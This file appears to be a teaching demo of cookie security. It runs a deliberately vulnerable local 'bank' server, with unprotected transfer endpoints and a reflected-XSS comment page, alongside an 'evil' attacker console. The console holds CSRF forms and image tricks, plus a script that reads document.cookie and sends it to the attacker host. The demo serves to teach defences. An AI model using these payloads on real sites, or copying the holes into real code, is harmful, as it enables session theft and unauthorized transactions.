import {
  demoHead,
  readPort,
  assertDistinctPorts,
  serveDemoAsset,
  listenOnLoopback,
  closeServers,
  logHttpRequest,
  ascii,
} from "../../../demo/server.ts"
import { createServer, type IncomingMessage, type ServerResponse } from "node:http"
import { randomUUID } from "node:crypto"

/* ==================== config ==================== */

const BANK_PORT = readPort("BANK_PORT", 3000)
const EVIL_PORT = readPort("EVIL_PORT", 3001)
assertDistinctPorts(BANK_PORT, EVIL_PORT)
const BANK = `http://localhost:${BANK_PORT}`
const EVIL = `http://127.0.0.1:${EVIL_PORT}`

type Variant = "legacy" | "hardened"

// evil console injects this into bank /comment, so the script runs on the bank origin
const XSS_PAYLOAD = `<script>
const stolen = document.cookie
const box = document.createElement('pre')
box.textContent = 'stolen document.cookie: ' + (stolen || '(empty — HttpOnly hides it)')
document.body.append(box)
new Image().src = '${EVIL}/collect?c=' + encodeURIComponent(stolen)
</script>`

/* ==================== helpers ==================== */

function parseCookies(header: string | undefined): Map<string, string> {
  const cookies = new Map<string, string>()
  if (!header) return cookies
  for (const part of header.split(";")) {
    const eq = part.indexOf("=")
    if (eq === -1) continue
    cookies.set(part.slice(0, eq).trim(), part.slice(eq + 1).trim())
  }
  return cookies
}

function sessionOf(req: IncomingMessage): { variant: Variant; id: string } | null {
  const sid = parseCookies(req.headers.cookie).get("sid")
  if (!sid) return null
  const variant: Variant = sid.startsWith("legacy-") ? "legacy" : "hardened"
  return { variant, id: sid }
}

async function readBody(req: IncomingMessage): Promise<string> {
  const chunks: Buffer[] = []
  for await (const chunk of req) chunks.push(Buffer.from(chunk))
  return Buffer.concat(chunks).toString("utf8")
}

function esc(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
}

function page(title: string, body: string): string {
  return `<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${esc(title)}</title>
${demoHead}
</head>
<body class="demo-page"><main>
<h1>${esc(title)}</h1>
${body}
</main></body>
</html>`
}

function sendHtml(res: ServerResponse, body: string, status = 200): void {
  res.writeHead(status, { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" })
  res.end(body)
}

function sendRedirect(res: ServerResponse, location: string): void {
  res.writeHead(302, { Location: location, "Cache-Control": "no-store" })
  res.end()
}

function logRequest(name: string, req: IncomingMessage, res: ServerResponse): void {
  const sid = parseCookies(req.headers.cookie).get("sid")
  res.setHeader("Cache-Control", "no-store")
  res.on("finish", () => {
    logHttpRequest(
      req,
      res.statusCode,
      name,
      `cookie=${sid ?? "absent"} origin=${req.headers.origin ?? "-"}`
    )
  })
}

function sessionBadge(session: { variant: Variant; id: string } | null): string {
  if (!session) return `<p>当前会话：<strong>未登录</strong></p>`
  const label =
    session.variant === "legacy"
      ? "legacy（SameSite=None，无 HttpOnly）"
      : "hardened（Secure + HttpOnly + SameSite=Lax）"
  return `<p>当前会话：<strong>${label}</strong><br><span class="muted">服务端读到 <code>sid=${esc(
    session.id
  )}</code></span></p>`
}

/* ==================== bank (victim) ==================== */

const bank = createServer(async (req, res) => {
  if (serveDemoAsset(req, res)) return
  const url = new URL(req.url ?? "/", BANK)
  logRequest("bank", req, res)

  if (url.pathname === "/login") {
    const variant: Variant = url.searchParams.get("variant") === "legacy" ? "legacy" : "hardened"
    const id = `${variant}-${randomUUID().slice(0, 8)}`
    res.setHeader(
      "Set-Cookie",
      variant === "legacy"
        ? `sid=${id}; Path=/; SameSite=None; Secure`
        : `sid=${id}; Path=/; Secure; HttpOnly; SameSite=Lax`
    )
    sendRedirect(res, "/")
    return
  }

  if (url.pathname === "/logout") {
    res.setHeader("Set-Cookie", "sid=; Path=/; Max-Age=0")
    sendRedirect(res, "/")
    return
  }

  if (url.pathname === "/") {
    const session = sessionOf(req)
    sendHtml(
      res,
      page(
        "Cookie 安全 Demo — bank（受害站点）",
        `
      ${sessionBadge(session)}
      <div class="card">
        <p>这里是受害站点 <code>${BANK}</code>。先选择一种会话配置登录，再去
        <a href="${EVIL}/">evil 控制台</a> 依次执行攻击，回来对比结果。</p>
        <p>
          <a href="/login?variant=legacy">以 legacy 登录</a>
          <span class="muted">Set-Cookie: sid=…; Path=/; SameSite=None; Secure</span><br>
          <a href="/login?variant=hardened">以 hardened 登录</a>
          <span class="muted">Set-Cookie: sid=…; Path=/; Secure; HttpOnly; SameSite=Lax</span><br>
          <a href="/logout">退出登录</a>
        </p>
      </div>
      <div class="card">
        <p><strong>站内转账</strong>（同源 POST，两种变体下都应当成功）</p>
        <form method="POST" action="/transfer">
          <label>金额 <input name="amount" value="1" size="6"></label>
          <label>收款人 <input name="to" value="alice" size="8"></label>
          <button type="submit">转账</button>
        </form>
      </div>
      <div class="card">
        <p class="muted">本站故意留了两个漏洞供演示：站内 <code>/transfer</code> 不做任何 CSRF 防护；
        <code>/comment?text=…</code> 原样输出参数（反射型 XSS）。生产代码绝不允许这样写。</p>
      </div>
    `
      )
    )
    return
  }

  if (url.pathname === "/transfer" && req.method === "POST") {
    const form = new URLSearchParams(await readBody(req))
    const amount = form.get("amount") ?? "?"
    const to = form.get("to") ?? "?"
    const session = sessionOf(req)
    const origin = esc(req.headers.origin ?? "(无 Origin 头)")
    const referer = esc(req.headers.referer ?? "(无 Referer 头)")
    if (!session) {
      sendHtml(
        res,
        page(
          "转账结果",
          `
        <div class="card good">
          <p><strong>转账被拒绝：请求未携带会话 Cookie，服务器无法确认操作者身份。</strong></p>
          <p>hardened 会话的 <code>SameSite=Lax</code> 让浏览器在这个跨站 POST 上省略了 Cookie，
          裸奔的服务器也就无机可乘。</p>
        </div>
        <p class="muted">amount=${esc(amount)} to=${esc(to)}<br>Origin: <code>${origin}</code><br>Referer: <code>${referer}</code></p>
        <p><a href="/">返回银行</a></p>
      `
        )
      )
      return
    }
    sendHtml(
      res,
      page(
        "转账结果",
        `
      <div class="card bad">
        <p><strong>转账已执行：${esc(amount)} 元已转给 ${esc(to)}。</strong></p>
        <p>服务器读到了 <code>sid=${esc(session.id)}</code>（${session.variant} 会话）。
        本服务器故意没有 CSRF token、也不校验 Origin——浏览器是否附带 Cookie 是唯一防线。</p>
        <p>如果这次请求来自 evil 的跨站表单，说明 legacy（<code>SameSite=None</code>）没有拦截它；
        请回 bank 改用 hardened 登录后重试同一攻击对比。如果这是站内表单，转账成功属正常行为。</p>
      </div>
      <p class="muted">Origin: <code>${origin}</code><br>Referer: <code>${referer}</code><br>
      真实服务器应在这里校验 Origin/Referer 并使用 CSRF token——SameSite 只是纵深防御中的一层。</p>
      <p><a href="/">返回银行</a></p>
    `
      )
    )
    return
  }

  if (url.pathname === "/account") {
    const session = sessionOf(req)
    if (!session) {
      sendHtml(res, page("我的账户", `<div class="card">未登录，请先 <a href="/">登录</a>。</div>`))
      return
    }
    sendHtml(
      res,
      page(
        "我的账户",
        `
      ${sessionBadge(session)}
      <div class="card">
        <p>余额：<strong>¥ 8,848.00</strong></p>
        <p class="muted">如果这个页面是点击 evil 站点上的链接跳转而来的：跨站顶级 GET 导航即使
        hardened（SameSite=Lax）通常也可携带 Cookie——Lax 通常不随跨站子资源或非安全方法请求发送，但允许顶层安全导航；结果仍受浏览器策略影响。</p>
      </div>
      <p><a href="/">返回银行</a></p>
    `
      )
    )
    return
  }

  if (url.pathname === "/gift") {
    const to = url.searchParams.get("to") ?? "attacker"
    const session = sessionOf(req)
    if (session) {
      console.log(
        `[bank] !!! GET /gift executed with ${session.variant} session; CNY 188 sent to ${ascii(to)}`
      )
    }
    if (req.headers["sec-fetch-dest"] === "image") {
      const color = session ? "#2b8a3e" : "#c2255c"
      res.writeHead(200, { "Content-Type": "image/svg+xml" })
      res.end(
        `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"><rect width="24" height="24" fill="${color}"/></svg>`
      )
      return
    }
    sendHtml(
      res,
      page(
        "领取结果",
        session
          ? `
      <div class="card bad">
        <p><strong>赠送已执行：¥ 188 已转给 ${esc(to)}。</strong></p>
        <p>这是一个修改了服务端状态的 GET 请求——只要会话 Cookie 被携带就会中招。
        跨站顶级 GET 导航连 SameSite=Lax 都不会拦，所以 GET 接口绝不允许做状态变更。</p>
      </div>
      <p><a href="/">返回银行</a></p>
    `
          : `
      <div class="card good">
        <p><strong>赠送未执行：请求未携带会话 Cookie。</strong></p>
        <p>hardened 会话的 <code>SameSite=Lax</code> 阻止浏览器在跨站子资源请求上附带 Cookie。</p>
      </div>
      <p><a href="/">返回银行</a></p>
    `
      )
    )
    return
  }

  if (url.pathname === "/comment") {
    const text = url.searchParams.get("text") ?? ""
    sendHtml(
      res,
      page(
        "留言板（含反射型 XSS 漏洞）",
        `
      <div class="card bad">
        <p><strong>本页面把 text 参数原样写入 HTML——模拟反射型 XSS。</strong>
        真实系统必须转义输出并配合 CSP。</p>
      </div>
      <div class="card">用户留言：${text}</div>
      <p><a href="/">返回银行</a></p>
    `
      )
    )
    return
  }

  sendHtml(res, page("404", `<p>未知路径</p>`), 404)
})

/* ==================== evil (attacker) ==================== */

const evil = createServer((req, res) => {
  if (serveDemoAsset(req, res)) return
  const url = new URL(req.url ?? "/", EVIL)
  logRequest("evil", req, res)

  if (url.pathname === "/") {
    sendHtml(
      res,
      page(
        "evil（攻击者控制台）",
        `
      <p class="muted">攻击者站点运行在 <code>${EVIL}</code>。先到
      <a href="${BANK}/">bank</a> 登录一个变体，再依次执行下面的攻击。每次攻击后回 bank 首页或看终端
      （<code>cookie=absent</code> 表示 Cookie 没有被浏览器附带）。</p>
      <div class="card">
        <p><strong>攻击 1 · CSRF：跨站自动提交 POST 表单</strong>（顶级导航 POST）</p>
        <p><a href="/csrf">伪造转账表单，向 bank POST /transfer</a></p>
      </div>
      <div class="card">
        <p><strong>攻击 2 · CSRF：跨站 GET 子资源</strong>（img 静默发起，无需点击）</p>
        <p><a href="/img-get">用 img 触发 bank GET /gift?to=attacker</a></p>
      </div>
      <div class="card">
        <p><strong>攻击 3 · CSRF：跨站顶级 GET 导航</strong>（需要点击伪装链接）</p>
        <p><a href="/link-get">“领优惠券” 链接 → bank GET /gift?to=attacker</a></p>
        <p class="muted">顺带观察：直接 <a href="${BANK}/account">打开 bank /account</a>，
        hardened 登录态下也会显示已登录——顶级 GET 导航不受 Lax 限制。</p>
      </div>
      <div class="card">
        <p><strong>攻击 4 · XSS：窃取 document.cookie</strong>（脚本在 bank 自己的页面上执行）</p>
        <p><a href="${BANK}/comment?text=${encodeURIComponent(XSS_PAYLOAD)}">打开被注入脚本的 bank /comment</a>，
        脚本会把 <code>document.cookie</code> 回传到本站 <a href="/collect">/collect</a>。</p>
      </div>
    `
      )
    )
    return
  }

  if (url.pathname === "/csrf") {
    sendHtml(
      res,
      page(
        "攻击 1：跨站 POST 表单",
        `
      <p>正在向 <code>${BANK}/transfer</code> 提交跨站转账（amount=10000, to=attacker）……</p>
      <form method="POST" action="${BANK}/transfer">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="to" value="attacker">
      </form>
      <script>document.forms[0].submit()</script>
    `
      )
    )
    return
  }

  if (url.pathname === "/img-get") {
    sendHtml(
      res,
      page(
        "攻击 2：跨站 GET 子资源",
        `
      <p>本页面静默插入一张指向 <code>${BANK}/gift?to=attacker</code> 的图片——一次跨站 GET
      子资源请求，用户毫无感知。方块颜色表示 bank 是否执行了赠送：
      <span style="display:inline-block;width:12px;height:12px;background:#2b8a3e;vertical-align:middle"></span>
      执行了，
      <span style="display:inline-block;width:12px;height:12px;background:#c2255c;vertical-align:middle"></span>
      未执行。</p>
      <p><img src="${BANK}/gift?to=attacker" alt="attack probe" width="24" height="24"></p>
      <p><a href="/">返回 evil 控制台</a></p>
    `
      )
    )
    return
  }

  if (url.pathname === "/link-get") {
    sendHtml(
      res,
      page(
        "攻击 3：跨站顶级 GET 导航",
        `
      <p>下面是一个伪装成领券活动的链接，点击后发生一次<b>顶级导航 GET</b>：</p>
      <p style="font-size:18px"><a href="${BANK}/gift?to=attacker">🎁 点击领取 188 元新人红包</a></p>
      <p class="muted">SameSite=Lax 有意放行顶级 GET 导航（保证外站链接跳转后仍是登录态），
      这正是“GET 不得修改状态”必须作为服务端铁律的原因。</p>
      <p><a href="/">返回 evil 控制台</a></p>
    `
      )
    )
    return
  }

  if (url.pathname === "/collect") {
    const stolen = url.searchParams.get("c") ?? ""
    sendHtml(
      res,
      page(
        "攻击 4：XSS 回传结果",
        `
      <div class="card ${stolen ? "bad" : "good"}">
        <p><strong>XSS 脚本回传的 document.cookie：</strong></p>
        <pre>${stolen ? esc(stolen) : "(空)"}</pre>
        <p>${
          stolen
            ? "会话 Cookie 被完整窃取——legacy 会话没有 HttpOnly。"
            : "会话 Cookie 没有出现——HttpOnly 拦住了脚本读取。"
        }</p>
      </div>
      <p><a href="/">返回 evil 控制台</a></p>
    `
      )
    )
    return
  }

  sendHtml(res, page("404", `<p>未知路径</p>`), 404)
})

/* ==================== demo ==================== */

function printDemoGuide(): void {
  console.log(`cookie demo
  bank   (victim)   ${BANK}
  evil   (attacker) ${EVIL}
  press Ctrl+C to stop
  choose other ports with BANK_PORT=3002 EVIL_PORT=3003

steps:
1. open ${BANK}/ in Chrome or Firefox
2. login as legacy or hardened
3. run attacks 1-4 from ${EVIL}/
4. compare results, then switch variant and repeat

notes:
  - keep evil on 127.0.0.1: localhost vs 127.0.0.1 is a cross-site pair,
    while ports are ignored for site computation
  - browser policy can further restrict cookies; inspect Network before concluding why a cookie is absent
  - terminal logs show response status, cookie=, and Origin; browser Network shows Cookie/Set-Cookie
  - HttpOnly hides the session from document.cookie, but does not prevent authenticated requests
  - walkthrough: docs/browser/storage/cookie/README.md`)
}

try {
  await listenOnLoopback(bank, BANK_PORT)
  await listenOnLoopback(evil, EVIL_PORT)
  for (const server of [bank, evil])
    server.on("error", (error) => {
      console.error(`Cookie server failed: ${ascii(error.message)}`)
      process.exitCode = 1
      closeServers(bank, evil)
    })
  process.once("SIGINT", () => closeServers(bank, evil))
  process.once("SIGTERM", () => closeServers(bank, evil))
  printDemoGuide()
} catch (error) {
  console.error(
    `Cookie startup failed: ${ascii((error as Error).message)}. Choose free BANK_PORT/EVIL_PORT values.`
  )
  process.exitCode = 1
  closeServers(bank, evil)
}

export {}
